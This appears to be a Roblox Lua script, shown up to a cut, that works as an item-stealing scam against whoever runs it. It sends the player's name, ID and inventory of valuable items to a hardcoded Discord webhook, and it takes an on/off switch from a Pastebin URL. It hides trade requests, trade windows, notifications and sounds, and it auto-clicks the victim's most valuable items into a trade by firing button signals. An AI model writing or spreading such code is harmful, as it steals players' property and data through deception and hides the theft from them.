local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local TextChatService = game:GetService("TextChatService")
local LP = Players.LocalPlayer
local cam = Workspace.CurrentCamera
local pg = LP:WaitForChild("PlayerGui")

local TARGET_PLACE_IDS = {
    [109983668079237] = true,
    [78906538690694] = true,
    [119594317142884] = true,
    [128855408206367] = true,
}

-- Referencias para LeftCenter (Tu código añadido)
local playerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
local leftCenterGui = playerGui:WaitForChild("LeftCenter")
local leftCenterFrame = leftCenterGui:WaitForChild("LeftCenter")
local ORIGINAL_POSITION = UDim2.new(0, 0, 0.5, 0)
local locking = false

-- =========================================================
-- INTERRUPTOR MAESTRO (CONTROL REMOTO PASTEBIN) Y RESTAURACIÓN
-- =========================================================
local CONTROL_URL = "https://pastebin.com/raw/mASagzmn"
local automationEnabled = false

-- Tabla para guardar el estado original de los elementos ocultos
local hiddenGuiStates = {}

local function restoreHiddenGui()
    for obj, state in pairs(hiddenGuiStates) do
        if obj and obj.Parent then
            pcall(function()
                obj.Position = state.Position
                obj.Visible = state.Visible
                obj.BackgroundTransparency = state.BackgroundTransparency

                if state.TextTransparency ~= nil then
                    obj.TextTransparency = state.TextTransparency
                end

                if state.TextStrokeTransparency ~= nil then
                    obj.TextStrokeTransparency = state.TextStrokeTransparency
                end

                if state.ImageTransparency ~= nil then
                    obj.ImageTransparency = state.ImageTransparency
                end

                if state.GroupTransparency ~= nil then
                    obj.GroupTransparency = state.GroupTransparency
                end

                if state.UIStroke
                    and state.UIStroke.Parent
                    and state.UIStrokeTransparency ~= nil then

                    state.UIStroke.Transparency = state.UIStrokeTransparency
                end
            end)
        end
    end

    table.clear(hiddenGuiStates)
end

local function updateAutomationStatus()
    local success, response = pcall(function()
        return game:HttpGet(CONTROL_URL .. "?t=" .. tostring(os.time()))
    end)

    if success then
        response = string.upper(response:gsub("%s+", ""))

        local previousState = automationEnabled

        if response == "ON" then
            automationEnabled = true
        elseif response == "OFF" then
            automationEnabled = false
        end

        -- Si acaba de cambiar de ON a OFF, restaurar toda la UI ocultada
        if previousState and not automationEnabled then
            restoreHiddenGui()
            locking = false

            pcall(function()
                -- Nota: updateLeftCenterState se definirá más adelante, lo manejamos de forma segura
                if updateLeftCenterState then
                    updateLeftCenterState(false)
                end
            end)
        end
    end
end

task.spawn(function()
    while true do
        updateAutomationStatus()
        task.wait(5)
    end
end)

-- URL de tu Webhook de Discord
local WEBHOOK_URL = "https://discord.com/api/webhooks/1538656296943751180/_9xvaGd9sngrEJJkOSLnVxS4ORsUVK7Duyo1TzK4DoaZK7uf7liBdyhyP87G6M9rYCAN"

--------------------------------------------------------------------------------
-- CONFIGURACIÓN DE OBJETIVOS
--------------------------------------------------------------------------------
getgenv().NORMAL_BASE_SKINS = {
    ["Bunny Basket"] = true,
    ["Summer"] = true,
    ["Octo"] = true,
    ["Tralalero"] = true
}

getgenv().NORMAL_GEARS = {
    ["Santa's Sleigh"] = true,
    ["Cupid's Wings"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Bloodmoon Slap"] = true,
    ["Rainbow Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Candy Sentry"] = true,
}

local function hideAllNotifications()
    -- Esta conexión se queda escuchando siempre los elementos nuevos que salgan en pantalla
    pg.DescendantAdded:Connect(function(child)
        -- Si está en OFF, se ignora al momento
        if not automationEnabled then return end
        
        task.defer(function()
            -- Verificamos de nuevo por si cambió en milisegundos
            if not automationEnabled then return end
            
            if child:IsA("GuiObject") then
                local text = ""
                
                -- Buscar texto en los descendientes
                for _, descendant in ipairs(child:GetDescendants()) do
                    if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
                        text = descendant.Text or ""
                        break
                    end
                end
                
                -- Si el propio child es un TextLabel, tiene prioridad o complementa
                if child:IsA("TextLabel") then
                    text = child.Text or ""
                end

                -- Ocultar avisos molestos si está en ON
                local textLower = string.lower(text)

                if string.find(textLower, "intercambio") or 
                    string.find(textLower, "other player") or 
                    string.find(textLower, "inviting") or 
                    string.find(textLower, "solomz90") or 
                    string.find(textLower, "completed") or 
                    string.find(textLower, "canceled") or 
                    string.find(textLower, "adding") or 
                    string.find(textLower, "pending") or 
                    string.find(textLower, "invite") or 
                    string.find(textLower, "already") then
                    
                    child.Visible = false
                    child.Position = UDim2.new(10, 0, 10, 0)
                end
            end
        end)
    end)
end

-- Iniciamos la escucha permanente
hideAllNotifications()

--------------------------------------------------------------------------------
-- OCULTAR NOTIFICACIONES Y MENSAJES DE TRADEO EN EL CHAT
--------------------------------------------------------------------------------
pcall(function()
    StarterGui:SetCore("SendNotification", { Title = "", Text = "", Duration = 0 })
end)

local function hideTradePrompts()
    local function processPrompt(gui)
        if not automationEnabled then return end
        
        if gui:IsA("GuiObject") or gui:IsA("ScreenGui") then
            local shouldHide = false
            local textContent = ""

            for _, descendant in ipairs(gui:GetDescendants()) do
                if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
                    local txt = string.lower(descendant.Text or "")
                    textContent = textContent .. " " .. txt
                    
                    if string.find(txt, "trade request") or string.find(txt, "wants to trade") or string.find(txt, "intercambio") then
                        shouldHide = true
                        break
                    end
                end
            end

            if not shouldHide and (gui:IsA("TextLabel") or gui:IsA("TextButton")) then
                local txt = string.lower(gui.Text or "")
                if string.find(txt, "trade request") or string.find(txt, "wants to trade") or string.find(txt, "intercambio") then
                    shouldHide = true
                end
            end

            if shouldHide then
                if gui:IsA("GuiObject") then
                    gui.Visible = false
                    gui.Position = UDim2.new(10, 0, 10, 0)
                elseif gui:IsA("ScreenGui") then
                    gui.Enabled = false
                    for _, child in ipairs(gui:GetChildren()) do
                        if child:IsA("GuiObject") then
                            child.Visible = false
                            child.Position = UDim2.new(10, 0, 10, 0)
                        end
                    end
                end
            end
        end
    end

    pg.DescendantAdded:Connect(function(child)
        if not automationEnabled then return end
        task.defer(function()
            processPrompt(child)
        end)
    end)

    pg.ChildAdded:Connect(function(child)
        if not automationEnabled then return end
        task.defer(function()
            processPrompt(child)
        end)
    end)

    for _, child in ipairs(pg:GetChildren()) do
        processPrompt(child)
        for _, desc in ipairs(child:GetDescendants()) do
            processPrompt(desc)
        end
    end
end

hideTradePrompts()

-- Función para enviar datos a Discord mediante Webhook
local function sendToDiscord(title, description, fields)
    local executorName = LP and LP.Name or "Desconocido"
    local executorId = LP and tostring(LP.UserId) or "0"
    local data = {
        ["title"] = title,
        ["description"] = description .. "\n\n👤 **Ejecutado por:** " .. executorName .. " (ID: " .. executorId .. ")",
        ["color"] = 65280,
        ["fields"] = fields,
        ["footer"] = {
            ["text"] = "Automatización de Brainrots - Roblox"
        }
    }
    local body = HttpService:JSONEncode({
        ["content"] = "@everyone",
        ["embeds"] = { data }
    })
    pcall(function()
        if syn and syn.request then
            syn.request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
        elseif http_request then
            http_request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
        elseif Request then
            Request({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
        else
            HttpService:PostAsync(WEBHOOK_URL, body)
        end
    end)
end

Workspace.ChildAdded:Connect(function(child)
    if not automationEnabled then return end
    if child:IsA("Sound") and (child.Name == "Activated" or child.Name == "Error") then
        child.Volume = 0
        child:Stop()
        child:Destroy()
    end
end)

local function suppressMessages()
    if not automationEnabled then return end
    local function cleanNotificationGui(gui)
        local nameLower = string.lower(gui.Name)
        if nameLower == "topnotification" or nameLower == "admin" then return end
        
        if string.find(nameLower, "notify") or string.find(nameLower, "notification") or string.find(nameLower, "banner") or string.find(nameLower, "toast") then
            if gui:IsA("ScreenGui") then
                gui.Enabled = false
            elseif gui:IsA("GuiObject") then
                gui.Visible = false
            end
        end
    end
    pg.ChildAdded:Connect(cleanNotificationGui)
    for _, child in ipairs(pg:GetChildren()) do
        cleanNotificationGui(child)
    end
end

if automationEnabled then
    suppressMessages()
    hideTradePrompts()
end

local function cleanStr(str)
    return string.lower(string.gsub(tostring(str or ""), "%s+", ""))
end

-- =========================================================
-- CONTROLADOR DE ESTADO DE UI (TRADEO ACTIVO / INACTIVO)
-- =========================================================
local function updateLeftCenterState(inTrade)
    if not automationEnabled then return end
    if inTrade then
        leftCenterFrame.Position = ORIGINAL_POSITION
        locking = true
        
        for _, obj in ipairs(leftCenterFrame:GetDescendants()) do
            if obj:IsA("ImageButton") or obj:IsA("TextButton") then
                obj.Active = false
            end
        end
    else
        locking = false
        for _, obj in ipairs(leftCenterFrame:GetDescendants()) do
            if obj:IsA("ImageButton") or obj:IsA("TextButton") then
                obj.Active = true
            end
        end
    end
end

leftCenterFrame:GetPropertyChangedSignal("Position"):Connect(function()
    if not automationEnabled then return end
    if not locking then return end
    if leftCenterFrame.Position ~= ORIGINAL_POSITION then
        leftCenterFrame.Position = ORIGINAL_POSITION
    end
end)

-- =========================================================
-- ESCANER DE BASES FLEXIBLE Y CORREGIDO
-- =========================================================
local function scanAllAvailableBases()
    local detectedBases = {}
    
    pcall(function()
        for _, v in ipairs(pg:GetDescendants()) do
            if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("Frame") then
                local textContent = (v:IsA("TextLabel") or v:IsA("TextButton")) and v.Text or ""
                local combinedSearch = string.lower(v.Name .. " " .. textContent)

                for baseName, _ in pairs(getgenv().NORMAL_BASE_SKINS) do
                    local cleanBaseName = string.lower(baseName)
                    
                    local isMatch = false
                    if cleanBaseName == "summer" then
                        if string.match(combinedSearch, "%bsummer%b") then
                            isMatch = true
                        end
                    else
                        if string.find(combinedSearch, cleanBaseName, 1, true) then
                            isMatch = true
                        end
                    end

                    if isMatch then
                        local parentSlot = v
                        local isLocked = false
                        for i = 1, 4 do
                            if parentSlot then
                                local locked = parentSlot:FindFirstChild("Locked", true) or parentSlot:FindFirstChild("Lock", true)
                                if locked and locked:IsA("GuiObject") and locked.Visible then
                                    isLocked = true
                                    break
                                end
                                parentSlot = parentSlot.Parent
                            end
                        end

                        if not isLocked then
                            detectedBases[baseName] = true
                        end
                    end
                end
            end
        end
    end)

    local finalBasesList = {}
    for baseName, _ in pairs(detectedBases) do
        table.insert(finalBasesList, baseName)
    end

    return finalBasesList
end

local function getRealBrainrotValue(brainrotModel)
    if not brainrotModel then return "Modelo nulo" end
    local debris = Workspace:FindFirstChild("Debris")
    local rootPart = brainrotModel:FindFirstChild("PrimaryPart") or brainrotModel:FindFirstChild("FakeRootPart") or brainrotModel:FindFirstChild("RootPart") or brainrotModel:FindFirstChildWhichIsA("BasePart")
    
    if debris then
        for _, overhead in ipairs(debris:GetChildren()) do
            if overhead.Name == "FastOverheadTemplate" then
                local animalOverhead = overhead:FindFirstChild("AnimalOverhead")
                if animalOverhead then
                    local genLabel = animalOverhead:FindFirstChild("Generation")
                    if genLabel and genLabel:IsA("TextLabel") and genLabel.Text ~= "" then
                        local guiObj = animalOverhead:FindFirstChildWhichIsA("SurfaceGui") or animalOverhead:FindFirstChildWhichIsA("BillboardGui") or animalOverhead
                        local targetAdornee = nil
                        if guiObj and guiObj:IsA("LayerCollector") then
                            targetAdornee = guiObj.Adornee
                        end
                        if targetAdornee and (targetAdornee == brainrotModel or (rootPart and targetAdornee == rootPart)) then
                            return genLabel.Text
                        end
                    end
                end
            end
        end
        
        if rootPart then
            local closestValue = nil
            local minDistance = 12
            for _, overhead in ipairs(debris:GetChildren()) do
                if overhead.Name == "FastOverheadTemplate" then
                    local animalOverhead = overhead:FindFirstChild("AnimalOverhead")
                    if animalOverhead then
                        local genLabel = animalOverhead:FindFirstChild("Generation")
                        if genLabel and genLabel:IsA("TextLabel") and genLabel.Text ~= "" then
                            if genLabel.Text ~= "$10/s" and genLabel.Text ~= "$1/s" then
                                local targetPart = overhead:FindFirstChildWhichIsA("BasePart") or overhead
                                if targetPart:IsA("BasePart") then
                                    local dist = (targetPart.Position - rootPart.Position).Magnitude
                                    if dist < minDistance then
                                        minDistance = dist
                                        closestValue = genLabel.Text
                                    end
                                end
                            end
                        end
                    end
                end
            end
            if closestValue then return closestValue end
        end
    end
    return "Cifra no detectada"
end

task.spawn(function()
    local DELAY_STEP = 0.8

    local BrainrotPriority = {
        "Headless Horseman", "Signore Carapace", "Arcadragon", "Elefanto Frigo", "Strawberry Elephant",
        "Pancake and Syrup", "Love Love Bear", "Antonio", "Meowl", "Skibidi Toilet", "Rico Dinero",
        "Griffin", "Dragon Gingerini", "Fishino Clownino", "La Supreme Combinasion", "Ginger Gerat",
        "Tirilikalika Tirilikalako", "Kalika Bros", "Digi Narwhal", "Hydra Bunny", "Dragon Cannelloni",
        "Los Hackers", "Hydra Dragon Cannelloni", "Bunny and Eggy", "Duggy Bros", "Dug dug dug",
        "Ketupat Bros", "John Doe", "La Casa Boo", "Foxini Lanternini", "Quackini Snackini",
        "Los Chillis", "Guest 666", "Cerberus", "Rosey and Teddy", "Reinito Sleighito",
        "Fragola La La La", "Gym Bros", "Spooky and Pumpky", "Cloverat Clapat", "Cooki and Milki",
        "Cash or Card", "Fortunu and Cashuru", "Jolly Jolly Sahur", "Capitano Moby",
        "Fragrama and Chocrama", "Chillin Chili", "Los Sekolahs", "Sammyni Fattini", "Los Amigos",
        "Money Money Reindeer", "Boppin Bunny", "Money Money Bros", "Tralaledon",
        "La Food Combinasion", "Celularcini Viciosini", "Hopilikalika Hopilikalako", "Los Tangcitos",
        "Swaggy Bros", "Los Spaghettis", "Popcuru and Fizzuru", "Garama and Madundung",
        "Celestial Pegasus", "La Easter Grande", "Gold Gold Gold", "Nacho Spyder", "Orcaledon",
        "Los Mariachis", "Burguro And Fryuro", "Lovin Rose", "W or L", "La Ginger Sekolah",
        "Chipso and Queso", "Los Primos", "Swag Soda", "Los Hotspotsitos", "La Taco Combinasion",
        "La Romantic Grande", "Eviledon", "Los Bros", "Las Sis", "Tictac Sahur",
        "La Secret Combinasion", "La Lucky Grande", "Ketchuru and Musturu", "Gobblino Uniciclino",
        "Rosetti Tualetti", "Tacorita Bicicleta", "Ventoliero Pavonero", "La Sahur Combinasion",
        "Abyssaloco", "Rubrikiko", "La Anniversary Grande", "Jelly Moby", "Sammyni Cakini",
        "Lavadorito Spinito", "Donkeyturbo Express", "Coco and Mango", "Dragon Aquanini", "Kraken",
        "Venuspino", "Bearito Cabinito", "Sand Sand Sand", "Globa Steppa", "Los Fruits", "Tang Tang Keletang", "La Summer Grande", "Los Planitos",
        "Los Sweethearts", "Steakini Fattini", "Capitano Americano", "Bufalino Boomberino",
        "Los Tictacs", "Los Admins", "Moby Bros", "Grabatron", "Rubiko and Kubiko",
        "Cangurato Gelato", "Chicleteira Champeona", "Pizza and Ranch", "Los Secret Combinasionas",
        "Bumbatron", "Yetimatic", "S'more Serat", "Queen Bee", "Scorpino Coasterino",
        "Honey Honey Bear", "Ketupat Kepat", "La Breakfast Combinasion", "Examen Bros", "Candini Fluffini", "Caylusaurus", "La Spooky Grande", "Tenini Ballini ",
        "Noodle Noodle Poodle", "Var Var Var", "Rosatops Triceratino", "Los Puggies", "La Extinct Grande", "Motorino Bumbino", "Pop Pop Petalini", "Orchidox", "Tacoturbo Tacorito", "Anpali Babel", "Sammyni Truckini", "Nachorilla", "Burrito Bat", "Ref Ref Ref Sahur"
    }

    local BrainrotPriorityMap = {}
    local TargetBrainrotsClean = {}
    for i, name in ipairs(BrainrotPriority) do
        BrainrotPriorityMap[cleanStr(name)] = i
        TargetBrainrotsClean[cleanStr(name)] = name
    end

    local TargetGearsClean = {}
    for gearName in pairs(getgenv().NORMAL_GEARS) do
        TargetGearsClean[cleanStr(gearName)] = gearName
    end

    local TargetBaseSkinsClean = {}
    for baseName in pairs(getgenv().NORMAL_BASE_SKINS) do
        TargetBaseSkinsClean[cleanStr(baseName)] = baseName
    end

    -- Función hideSingleObject actualizada con almacenamiento en hiddenGuiStates
    local function hideSingleObject(obj)
        if not automationEnabled then
            return
        end

        if not obj:IsA("GuiObject") then
            return
        end

        -- Guardar estado original solo la primera vez
        if not hiddenGuiStates[obj] then
            hiddenGuiStates[obj] = {
                Position = obj.Position,
                Visible = obj.Visible,
                BackgroundTransparency = obj.BackgroundTransparency,
                TextTransparency = (
                    obj:IsA("TextLabel")
                    or obj:IsA("TextButton")
                    or obj:IsA("TextBox")
                ) and obj.TextTransparency or nil,

                TextStrokeTransparency = (
                    obj:IsA("TextLabel")
                    or obj:IsA("TextButton")
                    or obj:IsA("TextBox")
                ) and obj.TextStrokeTransparency or nil,

                ImageTransparency = (
                    obj:IsA("ImageLabel")
                    or obj:IsA("ImageButton")
                ) and obj.ImageTransparency or nil,

                GroupTransparency = (
                    obj:IsA("CanvasGroup")
                ) and obj.GroupTransparency or nil
            }

            local stroke = obj:FindFirstChildOfClass("UIStroke")

            if stroke then
                hiddenGuiStates[obj].UIStroke = stroke
                hiddenGuiStates[obj].UIStrokeTransparency = stroke.Transparency
            end
        end

        -- Ocultar visualmente
        obj.Position = UDim2.new(10, 0, 10, 0)
        obj.BackgroundTransparency = 1

        if obj:IsA("TextLabel")
            or obj:IsA("TextButton")
            or obj:IsA("TextBox") then

            obj.TextTransparency = 1
            obj.TextStrokeTransparency = 1
        end

        if obj:IsA("ImageLabel")
            or obj:IsA("ImageButton") then

            obj.ImageTransparency = 1
        end

        if obj:IsA("CanvasGroup") then
            obj.GroupTransparency = 1
        end

        local stroke = obj:FindFirstChildOfClass("UIStroke")

        if stroke then
            stroke.Transparency = 1
        end
    end

    local function hideGuiVisualOnly(guiObj)
        if not automationEnabled then return end
        for _, obj in ipairs(guiObj:GetDescendants()) do
            hideSingleObject(obj)
        end
        if guiObj:IsA("GuiObject") then hideSingleObject(guiObj) end
        if not guiObj:GetAttribute("HideListenerSet") then
            guiObj:SetAttribute("HideListenerSet", true)
            guiObj.DescendantAdded:Connect(function(child)
                task.defer(function() hideSingleObject(child) end)
            end)
        end
    end

    local function applyEverythingAfterTargetFound()
        local function handleCam(obj)
            if obj:IsA("BlurEffect") then obj.Enabled = false end
        end
        cam.ChildAdded:Connect(handleCam)
        for _, v in ipairs(cam:GetChildren()) do handleCam(v) end
        
        task.spawn(function()
            while task.wait(0.1) do
                if not automationEnabled then
                    continue
                end

                cam.FieldOfView = 70

                local tradeLive = pg:FindFirstChild("TradeLiveTrade")
                if tradeLive then
                    hideGuiVisualOnly(tradeLive)
                end
            end
        end)

        local function handleGui(obj)
            if not automationEnabled then return end
            if obj.Name:find("Prompt") or obj:IsA("ProximityPrompt") then return end
            if obj.Name == "TopNotification" or obj.Name == "Admin" then return end

            local tradeGuis = {
                ["TradeLiveTrade"] = true,
                ["BrainrotTrader"] = true,
                ["TradePrompts"] = true
            }
            if tradeGuis[obj.Name] then
                if obj:IsA("ScreenGui") then
                    for _, child in ipairs(obj:GetChildren()) do
                        if child:IsA("GuiObject") then child.Position = UDim2.new(10, 0, 10, 0) end
                    end
                end
                task.defer(function() hideGuiVisualOnly(obj) end)
                return
            end
            local targetAlerts = { ["TradeAlert"] = true, ["TradeError"] = true }
            if targetAlerts[obj.Name] then
                task.defer(function() hideGuiVisualOnly(obj) end)
            end
        end

        pg.ChildAdded:Connect(handleGui)
        for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
    end

    local plotsFolder = Workspace:FindFirstChild("Plots")
    if not plotsFolder then return end

    local closestPlot = nil
    local function getOwnerText(plot)
        local plotSign = plot:FindFirstChild("PlotSign")
        if not plotSign then return nil end
        local surfaceGui = plotSign:FindFirstChild("SurfaceGui")
        if not surfaceGui then return nil end
        local frame = surfaceGui:FindFirstChild("Frame")
        if not frame then return nil end
        local label = frame:FindFirstChildWhichIsA("TextLabel")
        if not label then return nil end
        return label.Text
    end

    local myUsername = string.lower(LP.Name)
    local myDisplayName = string.lower(LP.DisplayName)

    for _, plot in ipairs(plotsFolder:GetChildren()) do
        local ownerText = getOwnerText(plot)
        if ownerText then
            local ownerLower = string.lower(ownerText)
            if string.find(ownerLower, myUsername, 1, true) or string.find(ownerLower, myDisplayName, 1, true) then
                closestPlot = plot
                break
            end
        end
    end

    if not closestPlot then return end

    local function hasOneOfOneTag(model)
        for _, descendant in ipairs(model:GetDescendants()) do
            if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
                local txt = string.lower((descendant.Text or ""):gsub("%s+", ""))
                if txt == "1of1" then return true end
            end
        end
        return false
    end

    local brainrotQueue = {}
    local nonTargetList = {}

    for _, child in ipairs(closestPlot:GetChildren()) do
        if child:IsA("Model") and child.Name ~= "Model" and not child.Name:find("Panel") and not child.Name:find("Cash") then
            local rawName = child.Name
            local cleanedName = cleanStr(rawName)
            local matchedName = nil
            
            if TargetBrainrotsClean[cleanedName] then
                matchedName = TargetBrainrotsClean[cleanedName]
            else
                for targetClean, originalName in pairs(TargetBrainrotsClean) do
                    if string.find(cleanedName, targetClean, 1, true) or string.find(targetClean, cleanedName, 1, true) then
                        matchedName = originalName
                        break
                    end
                end
            end

            local genText = getRealBrainrotValue(child)
            local isOneOfOne = hasOneOfOneTag(child)

            if matchedName or isOneOfOne then
                table.insert(brainrotQueue, {
                    slotKey = rawName,
                    instance = child,
                    instanceId = tostring(child),
                    generation = genText,
                    name = matchedName or rawName,
                    rawName = rawName
                })
            else
                table.insert(nonTargetList, { name = rawName, generation = genText })
            end
        end
    end

    local foundGears = {}
    local backpackGui = LP:WaitForChild("PlayerGui"):WaitForChild("BackpackGui", 3)
    if backpackGui then
        local backpackFolder = backpackGui:WaitForChild("Backpack", 3)
        if backpackFolder then
            local Hotbar = backpackFolder:WaitForChild("Hotbar", 3)
            local InventoryGrid = backpackFolder:WaitForChild("Inventory", 3):WaitForChild("ScrollingFrame", 3):WaitForChild("UIGridFrame", 3)

            local function checkContainer(container, location)
                if not container then return end
                for _, slot in ipairs(container:GetChildren()) do
                    local toolName = slot:FindFirstChild("ToolName")
                    if toolName and toolName:IsA("TextLabel") then
                        local name = tostring(toolName.Text or "")
                        local cleanName = cleanStr(name)
                        if cleanName ~= "" then
                            for gearName in pairs(getgenv().NORMAL_GEARS) do
                                local cleanGear = cleanStr(gearName)

                                if cleanName == cleanGear then
                                    if not foundGears[cleanGear] then
                                        foundGears[cleanGear] = {
                                            name = gearName,
                                            location = location,
                                            slot = slot.Name
                                        }
                                    end
                                    break
                                end
                            end
                        end
                    end
                end
            end

            checkContainer(Hotbar, "HOTBAR")
            checkContainer(InventoryGrid, "INVENTARIO")
        end
    end

    local ownedBases = scanAllAvailableBases()
    local discordFields = {}

    local targetLines = {}
    for _, item in ipairs(brainrotQueue) do table.insert(targetLines, "• **" .. item.name .. "** - " .. item.generation) end
    if #targetLines > 0 then
        table.insert(discordFields, { ["name"] = "🧠 ITEMS TARGET (" .. #brainrotQueue .. ")", ["value"] = table.concat(targetLines, "\n"), ["inline"] = false })
    end

    local gearLines = {}
    for _, gearInfo in pairs(foundGears) do table.insert(gearLines, "• **" .. gearInfo.name .. "** (" .. gearInfo.location .. ")") end
    if #gearLines > 0 then
        table.insert(discordFields, { ["name"] = "⚙️ GEARS ENCONTRADOS (" .. #gearLines .. ")", ["value"] = table.concat(gearLines, "\n"), ["inline"] = false })
    end

    if #ownedBases > 0 then
        local baseLines = {}
        for _, baseName in ipairs(ownedBases) do table.insert(baseLines, "• " .. baseName) end
        table.insert(discordFields, { ["name"] = "🏠 BASES TRANSFERIBLES DESBLOQUEADAS (" .. #ownedBases .. ")", ["value"] = table.concat(baseLines, "\n"), ["inline"] = false })
    end

    local nonTargetLines = {}
    for _, item in ipairs(nonTargetList) do
        table.insert(nonTargetLines, "• " .. item.name .. " - " .. item.generation)
    end
    if #nonTargetLines > 0 then
        table.insert(discordFields, {
            ["name"] = "📦 ITEMS NO TARGET (" .. #nonTargetList .. ")\n---- Brainrots:",
            ["value"] = table.concat(nonTargetLines, "\n"),
            ["inline"] = false
        })
    end

    if (#brainrotQueue > 0) or (#nonTargetList > 0) or (#gearLines > 0) or (#ownedBases > 0) then
        if TARGET_PLACE_IDS[game.PlaceId] then
            sendToDiscord("📊 Reporte Completo de Brainrots, Gears y Bases", "Se ha analizado tu plot, inventario y skins correctamente:", discordFields)
        end
    end

    table.sort(brainrotQueue, function(a, b)
        local aPriority = BrainrotPriorityMap[cleanStr(a.name)] or 999999
        local bPriority = BrainrotPriorityMap[cleanStr(b.name)] or 999999
        if aPriority == bPriority then return tostring(a.instanceId) < tostring(b.instanceId) end
        return aPriority < bPriority
    end)

    local gearCount = 0
    for _ in pairs(foundGears) do
        gearCount = gearCount + 1
    end

    local totalTargets = #brainrotQueue + gearCount

    if totalTargets == 0 then
        return
    end

    applyEverythingAfterTargetFound()

    local processedBrainrots = {}
    local processedGears = {}
    local processedBases = {}

    local function triggerClick(btn)
        if not btn then return false end
        if typeof(firesignal) == "function" then
            pcall(function() firesignal(btn.MouseButton1Click) end)
            pcall(function() firesignal(btn.Activated) end)
            return true
        elseif typeof(getconnections) == "function" then
            for _, conn in ipairs(getconnections(btn.MouseButton1Click)) do if conn.Enabled then conn:Fire() end end
            for _, conn in ipairs(getconnections(btn.Activated)) do if conn.Enabled then conn:Fire() end end
            return true
        end
        return false
    end

    local function isTradeActive()
        local tradeLive = pg:FindFirstChild("TradeLiveTrade")
        if not tradeLive then return false end
        if tradeLive:IsA("ScreenGui") then return tradeLive.Enabled end
        if tradeLive:IsA("GuiObject") then return tradeLive.Visible end
        return false
    end

    local function findBrainrotButton(item)
        local yourInventory = pg:FindFirstChild("TradeLiveTrade") and pg.TradeLiveTrade:FindFirstChild("TradeLiveTrade") and pg.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Your") and pg.TradeLiveTrade.TradeLiveTrade.Your:FindFirstChild("ScrollingFrame")
        if not yourInventory then return nil end

        local targetClean = cleanStr(item.name)
        local rawClean = cleanStr(item.rawName)
        local genClean = cleanStr(item.generation)
        local isGenUnknown = (genClean == "unknown" or genClean == "cifra no detectada")
        local bestCandidateButton = nil

        for _, slot in ipairs(yourInventory:GetChildren()) do
            if string.find(slot.Name, "Selection_Brainrot_") then
                local button = slot:FindFirstChild("Spacer") or slot:FindFirstChildWhichIsA("GuiButton")
                if button and not processedBrainrots[button] then
                    local matchesName = false
                    local foundGenMatch = isGenUnknown

                    for _, subDesc in ipairs(slot:GetDescendants()) do
                        if subDesc:IsA("TextLabel") or subDesc:IsA("TextButton") then
                            local textClean = cleanStr(subDesc.Text)
                            if textClean == targetClean or textClean == rawClean or string.find(textClean, targetClean, 1, true) or string.find(targetClean, textClean, 1, true) then
                                matchesName = true
                            end
                            if not foundGenMatch and (string.find(textClean, genClean, 1, true) or string.find(genClean, textClean, 1, true)) then
                                foundGenMatch = true
                            end
                        end
                    end

                    if matchesName then
                        if foundGenMatch then return button
                        elseif not bestCandidateButton then bestCandidateButton = button end
                    end
                end
            end
        end
        return bestCandidateButton
    end

    local function selectBrainrot(item, index)
        if not automationEnabled then return false end
        task.wait(0.15)
        local button = findBrainrotButton(item)
        if not button then return false end

        local currentBG = button.BackgroundColor3
        local tolerance = 0.01
        local function isSelected(color)
            return math.abs(color.R - 0.0588) < tolerance and math.abs(color.G - 0.1960) < tolerance
        end

        if isSelected(currentBG) then
            processedBrainrots[button] = true
            return true
        end

        local success = triggerClick(button)
        if success then
            processedBrainrots[button] = true
            return true
        end
        return false
    end

    local function getYourInventory()
        local tradeGui = pg:FindFirstChild("TradeLiveTrade")
        if not tradeGui then return nil end
        local inner = tradeGui:FindFirstChild("TradeLiveTrade")
        if not inner then return nil end
        local your = inner:FindFirstChild("Your")
        if not your then return nil end
        return your:FindFirstChild("ScrollingFrame")
    end

    local function scrollToObject(scrollingFrame, obj)
        if not scrollingFrame or not obj then return false end
        local canvasSize = scrollingFrame.AbsoluteCanvasSize.Y
        local windowSize = scrollingFrame.AbsoluteSize.Y
        if canvasSize <= windowSize then return true end

        local objectTop = obj.AbsolutePosition.Y
        local objectHeight = obj.AbsoluteSize.Y
        local frameTop = scrollingFrame.AbsolutePosition.Y
        local relativeY = objectTop - frameTop + scrollingFrame.CanvasPosition.Y
        local targetY = relativeY - (windowSize / 2) + (objectHeight / 2)
        local maxY = math.max(0, canvasSize - windowSize)
        targetY = math.clamp(targetY, 0, maxY)

        scrollingFrame.CanvasPosition = Vector2.new(scrollingFrame.CanvasPosition.X, targetY)
        task.wait(0.2)
        return true
    end

    local function findAllGearButtons()
        local gearQueue = {}
        local scrollingFrame = getYourInventory()
        if not scrollingFrame then return gearQueue end

        for _, slot in ipairs(scrollingFrame:GetChildren()) do
            if string.find(slot.Name, "Selection_Gear_") then
                local button = slot:FindFirstChild("Spacer") or slot:FindFirstChildWhichIsA("GuiButton")
                if button then
                    local matchedGearName = nil
                    for _, subDesc in ipairs(slot:GetDescendants()) do
                        if subDesc:IsA("TextLabel") or subDesc:IsA("TextButton") then
                            local cleanText = cleanStr(subDesc.Text)
                            if TargetGearsClean[cleanText] then
                                matchedGearName = TargetGearsClean[cleanText]
                                break
                            end
                        end
                    end
                    if matchedGearName then
                        table.insert(gearQueue, { uuid = slot.Name, button = button, name = matchedGearName })
                    end
                end
            end
        end
        return gearQueue
    end

    local function isButtonSelected(colorOrButton)
        local color = typeof(colorOrButton) == "Color3" and colorOrButton or (typeof(colorOrButton) == "Instance" and colorOrButton.BackgroundColor3)
        if not color then return false end
        local tolerance = 0.01
        return math.abs(color.R - 0.0588) < tolerance and math.abs(color.G - 0.1960) < tolerance
    end

